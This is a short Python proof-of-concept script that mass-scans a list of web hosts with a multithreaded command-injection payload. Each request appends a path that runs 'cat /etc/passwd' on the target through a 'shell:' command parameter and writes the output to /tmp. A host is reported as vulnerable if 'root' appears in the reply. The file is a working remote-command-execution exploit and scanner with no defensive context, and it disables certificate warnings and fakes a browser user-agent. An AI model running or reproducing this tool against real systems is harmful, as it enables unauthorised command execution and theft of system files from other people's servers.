# coding=UTF-8

import requests
import sys
import getopt
import math
import threading
import re

requests.packages.urllib3.disable_warnings()
payload = "(download)/tmp/a.txt?command1=shell:cat%20/etc/passwd|%20dd%20of=/tmp/a.txt"
#def usage():
#    print("python poc.py -u url -t threads -F word.txt")

def start():
    if len(sys.argv) == 5 :
        opts, args = getopt.getopt(sys.argv[1:], "t:u:")
        for k,v in opts:
            if k == "-t":
                threads = v
            elif k == "-u":
                dic = v
        m_scan(payload,threads,dic)
    else:
        print("erroe")
        

def m_scan(payload,threads,dic):
    result_list = []
    threads_list= []
    with open (dic,"r") as f:
        dic_list = f.readlines()
           

        if len(dic_list) % int(threads) == 0:
            threads_read_line_num = len(dic_list) / int(threads)
        else:
            threads_read_line_num = math.ceil(len(dic_list) / int(threads))
        
        i=0
        temp_list = []
        for line in dic_list:
            i=i+1
            if i % threads_read_line_num == 0:
                temp_list.append(line.strip())
                result_list.append(temp_list)
                temp_list = []
            else:
                temp_list.append(line.strip())
    
    for i in result_list:
        threads_list.append(threading.Thread(target=scan, args=(payload,i)))   
    for t in threads_list:
        t.start()

headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 8.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4388.124 Safari/527.36'
        } 

def scan(payload,dic):
    for line in dic:
        if ('http://' in line) or ('https://' in line):
            pass
        else:
            line = 'http://'+line
        try:
            r = requests.get(line+'/'+payload,timeout=8,headers=headers,verify=False)
            if "root" in r.text:
                print(line+"  vulnerability")
            else:
                pass
                #print(line+" not vulnerability")
        except:
            pass

if __name__ =="__main__":
    start()
     
       
